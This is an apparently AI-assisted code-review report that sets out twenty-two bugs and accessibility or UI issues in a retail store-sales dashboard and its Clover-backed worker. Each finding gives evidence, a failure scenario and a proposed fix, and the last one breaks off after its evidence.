**Evidence.** index.html:11383-11391: `const retail = sm.isCurrentWeek ? (sm.liveRetail ?? 0) : (m.aRetail || 0);` … `const orderCount = sm.isCurrentWeek ? (sm.liveOrderCount ?? sm.histOrderCount) : sm.histOrderCount;` … `const hasMetrics = sm.isCurrentWeek ? (sm.liveSales != null && sm.liveSales > 0) : …`. liveCloverData is fetched with `since=startOfToday` (index.html:8144), so these are today-only values. The big number beside them is week-to-date (`wkSales = m.aTotal + m.aAuction + liveSales + storeAuction`, 11400), and the tile header reads `Matrix · ${wkLbl}` = 'This Week' (11498). The LW/LY badges compare with getLastWeekCloverMetrics, which sums Sun→today of last week (elapsedDaysThisWeek, 7934-7950). The dashboard store card already does this correctly: `v1Orders = histOrderCount + liveOC` and order-weighted averages via wAvg (10090-10100). Reproduced by running the real showStoreDetail in node on Tuesday 2026-09-22 (Sun/Mon $12k and 400 orders each; live today $4.5k/150 orders): hero $28,500, but Retail $3,000 / BIN $1,500, Orders 150 with badge 'LW ↓87.5%'.

**Failure scenario.** A manager opens a store mid-week. The hero says $28,500 this week, while Channel Mix says Retail $3,000 · BIN $1,500 and Orders reads 150 with a red 'LW ↓87.5%'. Last week's matching Sun–Tue had 1,200 orders against 950 this week, so the real change is about −21%. Before the first sale of the day (liveSales 0 or null), all four matrix tiles show '—' and Channel Mix shows $0 in all three channels, even though Sun and Mon have full history.

**Proposed fix.** In showStoreDetail, combine stored days with live for the current week, as renderCards does (10087-10100):
```js
const liveOC = sm.isCurrentWeek && sm.liveOrderCount > 0 ? sm.liveOrderCount : 0;
const retail  = (m.aRetail || 0) + (sm.isCurrentWeek ? (sm.liveRetail || 0) : 0);
const bin     = (m.aBins   || 0) + (sm.isCurrentWeek ? (sm.liveBin    || 0) : 0);
const auction = (m.aAuction|| 0) + (sm.isCurrentWeek ? (sm.storeAuction || 0) : 0);
const wAvg = (h, hc, l) => { const ln = l != null && liveOC ? liveOC : 0; const t = hc + ln; return t ? ((h ?? 0) * hc + (ln ? l * ln : 0)) / t : null; };
const orderCount = sm.histOrderCount + liveOC;
const avgCart = wAvg(sm.histAvgCart, sm.histOrderCount, sm.liveAvgCart); // same for avgItems, avgTxnSec
const avgASP  = wAvg(sm.histAvgASP, sm.histOrderCount, sm.liveAvgASP);
const hasMetrics = sm.histDayCount > 0 || liveOC > 0 || m.aRetail != null;
```
Verify by re-running the node reproduction: Orders should read 950 with 'LW ↓20.8%', and Channel Mix should sum to the week total minus auction.

<a id="store-detail-2"></a>
#### store-detail-2 — All Stores page leaves auction out of its hero, By-Store rows and chart, but its budgets and the dashboard card that opens it include auction

*high · minor · bug · confidence high · `index.html:14535` · unverified*

**Evidence.** _asWeekTotals (index.html:14535): `const sales = (isToday && liveTotal != null && liveTotal > 0) ? liveTotal : r.aTotal;`. There is no rowAuction anywhere in the function, while `storeBudget += r.bTotal` (14542) uses an auction-inclusive budget (tasks/todo.md: 'r.bTotal is daily_sales.budget, which does include auction'). renderAllStoresDailyChart has the same gap: sales `(r.aTotal || 0)` (14750), LW `lwDowMap[dow] += r.aTotal || 0` (14772), LY (14786). Meanwhile the dashboard hero whose 'View Details →' (1487) opens this page uses `grandTotal = todayTotal + todayAuction` (9271). The same page's Daily tab adds `r.aAuction` (10685), and the store-detail hero each row drills into adds auction (11400). Nothing in tasks/ documents POS-only here; the only deliberate exception on record is buildAllStoresWeeklyTable's handling of today.

**Failure scenario.** For an auction store week (todo.md measured 2–6 points of pace from auction), the dashboard hero shows $X, and tapping View Details shows a lower All Stores hero and Pace %. The All Stores Daily tab total disagrees with the hero on the same page. Tapping Coliseum in the By-Store list shows a store hero larger than the row that was tapped.

**Proposed fix.** Count net = POS + auction on this page:
- _asWeekTotals: `const auc = rowAuction(r) || 0; const pos = (isToday && liveTotal > 0) ? liveTotal : r.aTotal; const sales = (pos != null || auc) ? (pos || 0) + auc : null;`
- renderAllStoresDailyChart: add `+ (rowAuction(r) || 0)` to today's/day sales and to the LW/LY sums.
Use rowAuction rather than `.aAuction` so scripts/test-today-auction-reads.mjs stays green. Optionally also count auction-only days in buildAllStoresWeeklyTable (10685 drops a day where POS is null and auction is present); leave its documented today behaviour alone. Verify by comparing the dashboard hero, the All Stores hero and the All Stores Daily total for a week containing auction.

<a id="store-detail-3"></a>
#### store-detail-3 — Transactions: a slow response for the previous store or day overwrites the newer selection

*high · minor · bug · confidence high · `index.html:14159` · unverified*

**Evidence.** loadTransactions (index.html:14159-14205) awaits `fetch(...action=transactions&store=…&date=…)`, then unconditionally calls `renderTransactions(data)`. There is no request token and no check that storeName/date still match currentStoreName/selectedTxnDate. renderTransactions labels the status line with the CURRENT store: `<b>${escapeHtml(shortName(storeName))}</b>` where `storeName = currentStoreName` (14269, 14314). Reproduced by running the sliced function in node: load BL1 (slow) → switch to BL2 (cached) → BL1's response lands → log shows `RENDER txns store=BL2` followed by `RENDER txns store=BL1 … (page shows BL2/BL7 South Bend)`.

**Failure scenario.** A manager opens Coliseum → Transactions. Today is a live Clover read taking several seconds. They go back and open South Bend → Transactions, which was cached earlier and paints at once. Coliseum's response then lands and replaces the table: the status line says 'South Bend · 2026-09-22 · 214 payments · read live from Clover', but the rows, totals, employees and customers are Coliseum's. The same happens when tapping Mon and then Tue quickly. Worse, the strip highlights Mon while selectedTxnDate is Tue, so the next row click (openTxnDetail → _txnKey) flips the table to Tue.

**Proposed fix.** Add a sequence guard; the response is still cached, only painting is skipped:
```js
let _txnSeq = 0;
async function loadTransactions(storeName, dateStr) {
  const seq = ++_txnSeq; …
  // after the fetch, once txnCache[key] has been written:
  if (seq !== _txnSeq || storeName !== currentStoreName) return;
  renderTransactions(txnCache[key] || errPayload);
```
The cache-hit path also bumps the counter, so an older in-flight request can never paint over it. Verify with the node harness in the scratchpad (race.mjs): the stale BL1 render must disappear.

<a id="store-detail-4"></a>
#### store-detail-4 — Item Sales (both pages): switching day or store while a load is in flight lets the older response overwrite the table

*high · minor · bug · confidence high · `index.html:13707` · unverified*

**Evidence.** loadItemSales (index.html:13622-13719) awaits fetch and then calls `renderItemSalesTable(data, isToday)` (13707). renderItemSalesTable draws the strip from the CURRENT `selectedItemDate` (13916) and the store from `currentStoreName` (13915), but draws the table from whatever `data` arrived. loadAllStoresItemSales (14955-14966) does the same with `asSelectedItemDate`. Reproduced in node: select Mon (slow), then Sun (fast); log shows `RENDER items date=2026-09-21 (strip selected 2026-09-20)`.

**Failure scenario.** The tab opens on today, a live Clover aggregation that takes seconds ('Loading category data from Clover…'). The manager taps Monday, which is a fast KV read, and Monday renders. Then today's live payload lands and replaces the table. The strip still highlights Monday, but the categories and Grand Total are today's, tagged Live. Switching stores mid-load does the same across stores.

**Proposed fix.** Same token pattern as Transactions, in loadItemSales and loadAllStoresItemSales: `const seq = ++_itemSeq;`, and after the await `if (seq !== _itemSeq || storeName !== currentStoreName) { cache it; return; }` (for All Stores, `seq !== _asItemSeq`). The WEEK branches need the same guard. Verify with race.mjs.

<a id="store-detail-5"></a>
#### store-detail-5 — Chart cards compare this week so far with the whole of last week, last year and the budget ('vs Last Week −66%' every Tuesday)

*high · minor · bug · confidence high · `index.html:10965` · unverified*

**Evidence.** renderDailySalesChart (index.html:10965-10969): `const twTotal = sum(salesData); const lwTotal = sum(lastWeekData); const lyTotal = sum(lastYearData); const budgetTotal = sum(budgetData);`. salesData covers only Sun→today (future days are 0), while lastWeekData, lastYearData and budgetData cover all 7 days. _buildChartCardHTML then prints `pctDelta(twTotal, lwTotal)` and `twTotal - budgetTotal` (10868-10889). renderAllStoresDailyChart does the same (14802-14806). The matrix already avoids this with elapsedDaysThisWeek ('comparing a week-to-date against the same elapsed slice … instead of the full 7 days (which made cumulative metrics … read as a huge false drop mid-week)', 7927-7932). Reproduced in node on Tuesday: card text 'This Week $28,500.00 −$55,500.00 vs budget · vs Last Week -66.1% −$55,500.00 · LW $84,000.00'.

**Failure scenario.** Every Sunday to Friday of the current week, both the store and All Stores Chart tabs show a large red 'vs Last Week' and 'vs Last Year' drop and a large 'vs budget' shortfall that do not exist. A store tracking +5% on the matching days reads −66% on Tuesday.

**Proposed fix.** In both chart functions, sum only the elapsed days when isCurrentWeek:
```js
const upto = isCurrentWeek && todayIdx >= 0 ? todayIdx + 1 : salesData.length;
const sumE = a => a.slice(0, upto).reduce((s, v) => s + (v || 0), 0);
const twTotal = sumE(salesData), lwTotal = sumE(lastWeekData), lyTotal = sumE(lastYearData), budgetTotal = sumE(budgetData);
```
Keep the full-week budget in the legend pill if wanted, labelled 'Budget (wk)'. Verify with chart.mjs: on Tuesday, vs Last Week should compare $28.5k with Sun–Tue of last week.

<a id="store-detail-6"></a>
#### store-detail-6 — Week-view Item Sales caches are not tied to the week on screen: All Stores reopens an old week, and store-detail drill/sort picks the first cached week

*high · minor · bug · confidence high · `index.html:14925` · unverified*

**Evidence.** loadAllStoresItemSales: `if (_asItemsCache.WEEK) { renderAllStoresItemTable(_asItemsCache.WEEK, true); return; }` (14925), stored as `_asItemsCache.WEEK = merged` (14947). The key has no week in it, and it is cleared only by loadAll(force) (8253) or the Refresh button. In store detail, drillItemCategory for WEEK does `const hit = Object.keys(itemSalesCache).find(k => k.startsWith(prefix))` (13883), which returns the FIRST WEEK entry for the store, not the one loadItemSales built (`${storeKey}:WEEK:${weekStart}:${weekEnd}`, 13641). setItemSort re-renders through the same path (13904). Reproduced in node: with W38 and W39 aggregates both cached, setItemSort and drillItemCategory both render 'Week of 2026-09-13 – 2026-09-19' while W39 is on screen.

**Failure scenario.** A regional manager views All Stores → Items → View Whole Week for this week. They go back, set the dashboard range to last week, open All Stores → Items → View Whole Week, and get this week's aggregate under last week's day strip. In store detail, after aggregating two weeks in one session, tapping a category or changing the sort order silently swaps the table to the older week.

**Proposed fix.** Key the All Stores cache by week: `const wk = 'WEEK:' + selectedWeek;`, then use `_asItemsCache[wk]` in loadAllStoresItemSales and drillAsItemCategory. In store detail, remember the key actually rendered (`let itemWeekKey = null;`, set where cacheKey is built at 13641) and have drillItemCategory use `itemSalesCache[itemWeekKey]` instead of `.find(startsWith)`. Verify with weekdrill.mjs.

<a id="store-detail-7"></a>
#### store-detail-7 — Worker items (live today): a failed Clover page is served as an empty day and the UI says 'No item sales data for today yet'; items-hour reports it as 'Store keys not found'

*medium · minor · bug · confidence high · `worker.js:27912` · unverified*

**Evidence.** worker.js:27912 `const result = aggregateItemSales(allElements || [], …)`. fetchItemOrders returns null on a failed page (`if (!resp.ok) return null;`), and the `|| []` turns that into a zero-sales 200. items-hour: `if (!elements) { return … { error: "Store keys not found" }, { status: 404 } }` (27382), which covers both 'no keys' and 'failed page'. Reproduced through the real worker (scripts/lib/worker-harness) with /orders answering 403: `items today -> status 200 categories 0 netSales 0`; `items-hour -> status 404 {"error":"Store keys not found"}`. On the client, loadItemSales caches the empty payload in itemSalesCache with no TTL (13706).

**Failure scenario.** Clover returns a 5xx or 429 that outlasts the retries on the order page during a busy afternoon. Item Sales shows 'No item sales data for today yet.' and keeps showing it for the whole session, because the empty payload is cached. On All Stores, that store silently contributes $0 to the chain Items total. The CLAUDE.md rule 'Assume Clover degrades by returning LESS' is broken on a read path.

**Proposed fix.** Worker-only and backward-compatible:
```js
if (allElements === null) return new Response(JSON.stringify({ error: 'Clover did not return a complete order list', code: 'INCOMPLETE_FETCH' }), { status: 502, headers: corsJson });
```
In items-hour, check merchant keys before fetching and return 502 INCOMPLETE_FETCH when `elements === null`. The client already treats a non-ok response as an error (13695) and restores the stashed copy after a forced refresh. Deploy is order-independent: an old client already handles non-2xx. Add a case to a test like test-transactions.mjs with /orders failing.

<a id="store-detail-8"></a>
#### store-detail-8 — Transactions endpoint (and archive banking) turn a failed refunds/credits fetch into 'zero refunds'; the UI then says it is a real reading

*medium · minor · bug · confidence high · `worker.js:1751` · unverified*

**Evidence.** fetchRefundElements catches and `return [];` (worker.js:1749-1752, commented 'Returns [] on failure'); fetchManualRefunds does the same (1788-1791). The transactions handler only guards `if (orders === null)` (27859), so refunds and credits failing produce a normal 200. bankTransactionsDay (2225-2240) has the same shape, and assessArchiveCompleteness tolerates 5% drift (2183), so a day whose refunds are under 5% of net banks as complete. Frontend: `No ${label} on this day … That is a real reading, not a failure to load.` (14330-14331). Reproduced through the real worker with /refunds and /credits answering 403: `status 200 counts {"payment":1,"refund":0,"manual":0,"void":0} refunded 0`.

**Failure scenario.** The refunds endpoint fails persistently on a live read. The Refunds and Manual Refunds tabs show 0 with a sentence explicitly asserting that this is not a load failure, and 'Refunded' reads $0.00; the payload stays in txnCache for the session. If it happens during nightly banking, the day is archived without its refund rows, flagged complete, and becomes unrecoverable once it ages out of Clover's ~90-day window.

**Proposed fix.** Worker-only. Add a `strict` option (`fetchRefundElements(store, env, since, until, { strict: true })`, same for fetchManualRefunds) that returns null instead of [] on failure. aggregateItemSales callers keep the lenient default. In the transactions handler, `if (orders === null || refunds === null || credits === null)` → the existing 502 INCOMPLETE_FETCH, which the UI already explains with a retry button. In bankTransactionsDay, do the same and return `skipped: 'INCOMPLETE_FETCH'`. That only adds a refusal and changes nothing that is written. Extend test-transactions.mjs and test-payment-archive.mjs with a failing /refunds stub. Deploy the worker alone; the frontend needs no change.

<a id="store-detail-9"></a>
#### store-detail-9 — All Stores Items silently drops any store whose fetch failed and caches the partial chain total

*medium · minor · bug · confidence high · `index.html:14961` · unverified*

**Evidence.** index.html:14961 `return fetch(url, …).then(r => r.ok ? r.json() : null).catch(() => null);` → `const valid = responses.filter(r => r && !r.error); const merged = mergeItemSalesData(valid, …); _asItemsCache[targetDate] = merged;` (14963-14965). The WEEK path does the same across 5 stores × 7 days (14940-14947). The Grand Total row reads '… categories · all stores' (15144), and nothing indicates that a store is missing. For a past date, the cached partial result persists until a full dashboard refresh; the Refresh button only appears on today.

**Failure scenario.** One store's KV read or live Clover call fails (a 429 is more likely when the WEEK view fires 35 requests at once). The chain 'Item Sales · All Stores' Grand Total is short by that store's sales, labelled 'all stores', and stays cached for that date for the rest of the session.

**Proposed fix.** Track failures: `const failed = STORES.filter((_, i) => !responses[i] || responses[i].error);`. If any failed, render a status line such as 'South Bend didn't load — totals exclude it · Retry', and do not cache (or cache with a `__partial` flag that forces a refetch on the next open). Apply the same to the WEEK branch by counting per-store-day failures.

<a id="store-detail-10"></a>
#### store-detail-10 — Hourly modals: a late response paints over a newer day, and a request finishing after close builds a chart into the hidden modal

*medium · minor · bug · confidence high · `index.html:11078` · unverified*

**Evidence.** showHourlyModal sets the title and subtitle synchronously (11062-11064), then `await Promise.all([cachedFetch(curUrl…), cachedFetch(lwUrl…)])` (11079) and renders stats and the chart with no check that this is still the requested day or that the modal is still open. closeHourlyModal destroys the chart (11223), but a response arriving afterwards runs `new Chart(el('hourly-chart'), …)` into the hidden modal. showHourlyItemsModal (11250-11324) has the same shape. cachedFetch has no in-flight de-duplication, so a double tap fires two requests.

**Failure scenario.** The manager taps Thursday on the chart (not cached, two full-day Clover reads), closes the modal, and taps Friday (cached, instant). Thursday's response then lands and replaces the stats, peak/slow hours and chart, while the subtitle still says 'Fri, Sep 25'. The hourly figures are then attributed to the wrong day.

**Proposed fix.** `let _hourlySeq = 0;` and at the top of showHourlyModal `const seq = ++_hourlySeq;`. After the await: `if (seq !== _hourlySeq || el('hourly-modal').classList.contains('hidden')) return;`. closeHourlyModal also bumps `_hourlySeq`. Do the same with `_itemsHourSeq` in showHourlyItemsModal and closeHourlyItemsModal.

<a id="store-detail-11"></a>
#### store-detail-11 — Hourly modal for a day older than Clover's ~90-day window shows 'This Day $0.00', a flat chart and a $0 Last Week

*medium · minor · bug · confidence medium · `index.html:11074` · unverified*

**Evidence.** showHourlyModal always calls `?action=hourly&store=…&date=${dateStr}` (11074-11076). The worker handler reads Clover live with no retention wall: `const elements = await fetchCloverOrders(store, env, sinceTs, untilTs);` (worker.js:27425) and returns 24 zeros when Clover returns nothing. The transactions endpoint does check retention (TXN_RETENTION_DAYS = 90, a named BEYOND_RETENTION refusal); hourly and items-hour do not. The chart can reach any week back to 2025-01-01, because history_d1 is loaded from=2025-01-01 (8066).

**Failure scenario.** A manager picks a week from May on the dashboard range, opens a store's Chart tab (data from D1, correct), and taps Tuesday. The modal says 'This Day $0.00', draws the 8 AM–8 PM default window flat at zero, and shows 'Last Week $0.00', contradicting the $11k point they just tapped. Near the edge (day 85, LW day 92), This Day is real while LW is $0, and the delta line disappears.

**Proposed fix.** Frontend guard in showHourlyModal (about 15 lines): compute `ageDays` from the ET date. If the day is more than 89 days old, show a named message in errorEl instead of fetching ('Clover keeps about 90 days of order detail, so hourly figures for Tue, May 12 are no longer available. The day's total on the Daily tab is still correct.'). If only the LW date is past the window, drop the LW series and its stat card. Longer term (major: worker then frontend), serve old days from the nightly `item-hours:` KV bank that backfill-item-hours already writes.

<a id="store-detail-12"></a>
#### store-detail-12 — Refresh gaps: All Stores never repaints after a refresh, pull-to-refresh on Transactions reuses the cached list, and every in-place rerender resets the Item Sales drill and closes the open transaction

*medium · minor · bug · confidence high · `index.html:8312` · unverified*

**Evidence.** When live data lands, loadAll only re-renders store detail: `if (currentPage === 'store-detail' && currentStoreName) showStoreDetail(currentStoreName, false, { rerender: true });` (8312, likewise 8522). No code re-renders `#as-metrics` or the All Stores tabs; buildAllStoresHero is called only from showAllStoresDetail (14497). pullRefreshAction → loadAll(true) busts _apiCache, today's itemSalesCache and _asItemsCache (8239-8253) but not txnCache. The rerender calls `switchStoreTab(currentStoreTab)` (11543), which runs `drilledCategory = null` (13580) and `txnSelected = null` (13586). That contradicts the comment at 11358 ('Preserve their tab/scroll/day').

**Failure scenario.** (a) On a cold start the user taps View Details before the live Clover fetch lands. The All Stores hero shows OFFLINE with today's sales missing, and pull-to-refresh spins and completes without changing anything. (b) On Transactions (today), pull-to-refresh collapses the open row and re-renders the same stale cached list, still tagged Live. (c) A manager drilled into 'Toys' pulls to refresh and is thrown back to the category list.

**Proposed fix.** 1) Next to the two store-detail rerender hooks (8312, 8522), add `if (currentPage === 'all-stores-detail') rerenderAllStoresDetail();`, which rebuilds #as-metrics and re-runs the active tab's render without resetting it (track `currentAsTab` in switchAllStoresTab). 2) In loadAll(force), also delete today's txnCache keys: `for (const k of Object.keys(txnCache)) if (k.endsWith(':' + _t)) delete txnCache[k];`. 3) In switchStoreTab, reset drilledCategory and txnSelected only when `tab !== previousTab`, not on a rerender of the same tab. Optionally print 'as of 2:14 PM' next to the Live tags, since nothing auto-refreshes.

<a id="store-detail-13"></a>
#### store-detail-13 — The header back chevron never pops the history entry the detail pages push, so Android back re-opens previously visited detail pages or does nothing

*medium · minor · bug · confidence high · `index.html:1565` · unverified*

**Evidence.** The back buttons call `onclick="navigateToDashboard()"` (1565, 1801), which routes through navigateToPage and never touches history (no pushState or back() anywhere in navigateToPage). The detail pages push history on forward navigation: `history.pushState({ page: 'store-detail', store: storeName }, '')` (11552) and `history.pushState({ page: 'all-stores-detail' }, '')` (14509). The popstate handler (15165-15173) re-opens whichever detail state it lands on. Open hourly modals are not closed on popstate either.

**Failure scenario.** On Android (browser or installed PWA): Dashboard → Coliseum → back chevron → Dashboard → South Bend → back chevron → Dashboard. Now the system Back gesture opens Coliseum again instead of leaving. From Dashboard → All Stores → a store → back chevron, system Back takes the user from the dashboard to All Stores. A Back gesture with the hourly modal open navigates the page underneath and leaves the modal on top.

**Proposed fix.** Route the chevrons through history when this page owns the top entry:
```js
function detailBack() {
  const st = history.state && history.state.page;
  if (st === 'store-detail' || st === 'all-stores-detail') history.back(); // popstate does the rest
  else navigateToDashboard();
}
```
Use `onclick="detailBack()"` with aria-label 'Back'. In the popstate listener, first close #hourly-modal and #items-hour-modal if they are open. That also makes the chevron agree with swipe-back, which already returns to All Stores. Verify with a Playwright run using page.goBack() after each chevron tap.

<a id="store-detail-14"></a>
#### store-detail-14 — Transactions: every row click re-renders the whole table, resetting its internal scroll to the top, and the detail drawer opens below the 62vh table, off-screen on a phone

*medium · minor · ui-ux · confidence high · `index.html:14124` · unverified*

**Evidence.** openTxnDetail, toggleTxnItems and setTxnTab all call `renderTransactions(txnCache[key])` (14124-14134), which replaces the whole body: `body.innerHTML = \`…${sum}${archiveWarn}${status}${table}${detail}${legend}\`` (14370-14378). The table sits in `.txn-scroll{overflow-y:auto;max-height:min(62vh,620px)}` (1666), so each render creates a fresh scroller at scrollTop 0. The drawer `${detail}` is appended after the table rather than next to the row. A busy day has roughly 200–400 rows (the worker notes about 115,798 paid orders across 6 stores over about 90 days), all rebuilt on every tap.

**Failure scenario.** On a 393px phone, a manager scrolls the table to a 3:42 PM refund about 150 rows down and taps it. The table jumps back to the 9 AM rows, the highlighted row is out of view, and the drawer is below the 62vh table, so they have to scroll the page to find it. Opening the receipt ('Items sold') resets the scroll again.

**Proposed fix.** Minimal: in renderTransactions, capture `const st = body.querySelector('.txn-scroll')?.scrollTop || 0;` before assigning innerHTML, restore it afterwards, then `body.querySelector('.txn-dt')?.scrollIntoView({ block: 'nearest', behavior: 'smooth' })` when txnSelected is set. Better (a follow-up): toggle the `txn-on` class and swap only a `#txn-detail` region, so a click no longer rebuilds 400 rows.

<a id="store-detail-15"></a>
#### store-detail-15 — Clickable rows (item categories on both pages, All Stores store rows, transaction rows) are not keyboard-focusable and have no light-theme hover

*medium · minor · accessibility · confidence high · `index.html:14030` · unverified*

**Evidence.** `<div onclick="drillItemCategory(${safeName})" class="… hover:bg-[rgba(255,255,255,0.018)] cursor-pointer …">` (14030), and the same at 15104 for All Stores. `<div ${onClick} class="… cursor-pointer">` opens a store (14658). `<tr${on} onclick="openTxnDetail(…)">` (14353). None has tabindex, a role or a key handler. DESIGN.md §9: 'All interactive elements that previously were clickable <span>s were converted to real <button>s'. The item-row hover is white-on-white in light (no `dark:` split), as is the sub-bar `bg-[rgba(255,255,255,0.015)]` (14058, 13999).

**Failure scenario.** A keyboard or switch-access user cannot drill into a category, open a store from All Stores, or open a transaction's detail; screen readers announce plain text with no action. In light theme, the category rows show no hover feedback on desktop.

**Proposed fix.** Add `role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();this.click()}"` and a `focus-visible:ring-2 focus-visible:ring-accent-green` to the three div rows and the `<tr>` (or wrap the time cell in a real `<button>`). Replace `hover:bg-[rgba(255,255,255,0.018)]` with `hover:bg-[rgba(20,16,8,0.02)] dark:hover:bg-[rgba(255,255,255,0.018)]`, as the Daily rows already do (10565).

<a id="store-detail-16"></a>
#### store-detail-16 — Charts: the This Week line plots future days as $0, and the y-axis loses beginAtZero on every re-render

*medium · minor · bug · confidence medium · `index.html:10943` · unverified*

**Evidence.** `const netOf = (r) => (r ? (r.aTotal || 0) + (rowAuction(r) || 0) : 0);` … `return netOf(r);` (10934-10943). The comparison series use netOrNull precisely because 'absent, not a zero — the series has to break there rather than plot the floor' (10935-10937), but This Week does not. Node run on Tuesday: `Wed 0, Thu 0, Fri 0, Sat 0`. All Stores: `(r.aTotal || 0)` (14750). The creation path sets `y: {…, beginAtZero: true}` (11037, 14847), but the update paths replace the whole object without it: `dailySalesChart.options.scales.y = { ticks: …, grid: … }` (11011, 14828). The hourly chart's update path does keep it (11179). Chart.js 4.4 defaults beginAtZero to false. I could not load Chart.js here because the CDN is blocked by the proxy, so the axis half rests on Chart.js semantics.

**Failure scenario.** Every current-week chart shows the green line and its filled area dropping to $0 after today, which looks like a collapse in sales. When viewing a past week and returning to the Chart tab (or after any rerender), the axis starts at, for example, $8,000, which exaggerates day-to-day differences compared with the first render.

**Proposed fix.** In renderDailySalesChart, `if (dateKey > todayStr) return null;`. In renderAllStoresDailyChart, keep `sales: null` for future dates (track hasSales, as buildAllStoresWeeklyTable does). Add `beginAtZero: true` to both update branches at 11011 and 14828.

<a id="store-detail-17"></a>
#### store-detail-17 — LW/LY comparison badges fail contrast in light theme (3.03 and 3.46:1), their 'LW'/'LY' labels fail in both themes (1.92–2.76:1), and they render at 8px

*medium · minor · accessibility · confidence high · `index.html:7966` · unverified*

**Evidence.** renderComparisonBadge: `const cls = isGood ? 'text-green-600 dark:text-green-400' : 'text-red-500 dark:text-red-400'; return \`<span class="${cls} text-[8px] font-semibold" …><span class="opacity-60">${label}</span> …` (7966-7967). Its only caller is the store-detail matrix (11505-11523), where it sits on `bg-accent-green/10`. Computed against the composited tile (#22c55e at 10% over the ground): light green-600 3.03, red-500 3.46; dark green-400 8.72, red-400 5.49; label at 0.6 opacity: light 1.92/2.21, dark red 2.76. None of the app's light-theme overrides cover green-600 or red-500.

**Failure scenario.** In light theme (the warehouse-daylight case), every LW/LY delta on the store hero is below AA, and the LW/LY tags are close to invisible in both themes at 8px, the smallest text on the page.

**Proposed fix.** `const cls = isGood ? 'text-[#166534] dark:text-green-400' : 'text-[#a5281a] dark:text-red-400';` (6.55 and 6.61:1 on the light tile, 10.06 and 6.34 on OLED). Drop `opacity-60` from the label and raise the badge to `text-[10px]`. Rebuild so the arbitrary classes compile.

<a id="store-detail-18"></a>
#### store-detail-18 — Item Sales and Transactions ignore the week the page is showing: they default to today, selectedTxnDate carries over between stores, and selectedItemDate survives a week change

*medium · minor · ui-ux · confidence high · `index.html:13916` · unverified*

**Evidence.** `let selectedItemDate = null;  // … null = today` (13599) and `let selectedTxnDate = null;    // null = today` (14100). renderItemSalesTable uses `const activeDate = selectedItemDate || getETTodayStr();` (13916), but the strip is built from `r.week === selectedWeek` (13827). showStoreDetail resets selectedItemDate only on a non-rerender (11366) and never resets selectedTxnDate. setDateRange → showStoreDetail(rerender) keeps the old selectedItemDate. loadTransactions falls back to today (14165), and the All Stores Items tab always resets to today (14727).

**Failure scenario.** A district manager sets the dashboard to last week and opens a store. Daily and Chart show last week, but Item Sales and Transactions open on TODAY's live data (tagged Live) under a strip of last week's days with none selected. After choosing Monday on Coliseum's Transactions and then opening South Bend, Transactions opens on Monday while Item Sales opens on today.

**Proposed fix.** Add a helper `defaultDayForWeek()` that returns today when selectedWeek === currentWeek, else the last date of selectedWeek. Use it wherever the code falls back to getETTodayStr() for these two tabs (13916, 13680, 14165, 14154/14270, 14921/15002). Reset selectedTxnDate alongside selectedItemDate in showStoreDetail (11366), and reset both when setDateRange moves to a week that doesn't contain them.

<a id="store-detail-19"></a>
#### store-detail-19 — Segmented tabs are 31px tall with no nowrap or tab semantics; 'Item Sales' wraps at narrow widths

*low · minor · ui-ux · confidence medium · `index.html:1586` · unverified*

**Evidence.** Tabs (1586-1595, 1822-1831; class string repeated in switchStoreTab 13569-13571): `px-3.5 py-1.5 … text-[12.5px]` with no `whitespace-nowrap`, inside `inline-flex … w-fit`. Measured in Chromium with the prebuilt site (Geist was blocked by the proxy, so this is the fallback font): every tab is 31px tall. At 393px, 'Item Sales' wrapped to 50px tall; at 360px the row overran its gutter by 7px (tabsRight 351 against content edge 344). The back button is 36×36. The buttons carry no role=tab or aria-selected, although the Transactions sub-tabs do (14285, 14377).

**Failure scenario.** On small phones (and at 393px when the web font fails and the fallback loads), the four-tab row wraps 'Item Sales' onto two lines and pokes into the right gutter. On every phone the tabs are hard targets at 31px against the 44px guideline. Screen-reader users hear four unrelated buttons with no selected state.

**Proposed fix.** Rename the label to 'Items' (matching All Stores), add `whitespace-nowrap min-h-[40px]`, and let the container be `flex w-full sm:w-fit` with `flex-1 sm:flex-none` buttons. Add `role="tablist"` on the container and `role="tab"` on each button, and set `aria-selected` in switchStoreTab and switchAllStoresTab. Make the back buttons `w-11 h-11`.

<a id="store-detail-20"></a>
#### store-detail-20 — OFFLINE pill text is #8893a7 in light theme: 2.80:1 on the hero's green corner, 3.10:1 on white

*low · minor · accessibility · confidence high · `index.html:11428` · unverified*

**Evidence.** `const liveCol = showLive ? 'var(--v1-good)' : 'rgb(var(--op-inkDim))';` (11428; same at 14582 in buildAllStoresHero). --op-inkDim is defined only for the dark themes (`:root { --op-inkDim: 136 147 167 }`, line 56) and is not re-pointed in light, so the inline colour is dark-theme grey on a white panel. The pill sits where the radial `rgba(34,197,94,0.12)` highlight is strongest (11435). Computed: 2.80 on the composited corner and 3.10 on bare white. Dark passes (4.72–5.74).

**Failure scenario.** In light theme, on any past week or before the first sale of the day, the OFFLINE status on both heroes is below AA.

**Proposed fix.** Add a theme-aware variable next to --v1-*: `:root{--v1-dim:#6b6453} html.dark{--v1-dim:rgb(var(--op-inkDim))}`, and use `var(--v1-dim)` for the text colour (5.30:1 on the corner in light). Keep the dot and the 35% border on the existing value, since they are not text.

<a id="store-detail-21"></a>
#### store-detail-21 — Month/week selects and the sort select are 11.5–12px, so iOS zooms the page on focus

*low · minor · ui-ux · confidence high · `index.html:10401` · unverified*

**Evidence.** `<select id="sd-month-select" … class="text-[12px] …">` (10401), `sd-week-select` (10405), and the Item Sales sort `<select … class="text-[11.5px] …">` (14483). The viewport meta is `width=device-width, initial-scale=1.0, viewport-fit=cover` (line 5), and there is no global 16px rule for form controls.

**Failure scenario.** On an iPhone (including the installed PWA), tapping the Month, Week or 'Sort:' select zooms the page. The user then has to pinch back out, and the layout stays zoomed after the picker closes.

**Proposed fix.** Use `text-[16px] sm:text-[12px]` on the two selects and `text-[16px] sm:text-[11.5px]` on the sort select; the visual size is unchanged from sm up.

<a id="store-detail-22"></a>
#### store-detail-22 — Hourly modals lack dialog semantics and focus management, have a 32px close button, and can only be opened by tapping a canvas point

*low · minor · accessibility · confidence high · `index.html:7386` · unverified*

**Evidence.** `<div id="hourly-modal" class="hidden fixed inset-0 z-50 …">` (7386) and `#items-hour-modal` (7415) have no role="dialog", aria-modal or aria-labelledby. Opening does not move focus into the modal and closing does not return it. The close button is `p-1` around a 24px icon, 32px in total (7394, 7423). The only way into the hourly view is the Chart.js canvas onClick (10981-10994); the Daily-tab rows are not interactive.

